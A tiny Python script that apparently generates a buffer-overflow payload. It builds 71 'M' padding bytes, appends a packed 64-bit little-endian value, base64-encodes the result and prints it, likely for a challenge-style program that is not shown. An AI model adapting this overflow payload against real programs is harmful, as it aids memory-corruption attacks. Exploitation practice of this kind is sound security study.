
import sys
import struct
import base64

buf = b'MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM'
buf += struct.pack('<Q', 15829534834097782266)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
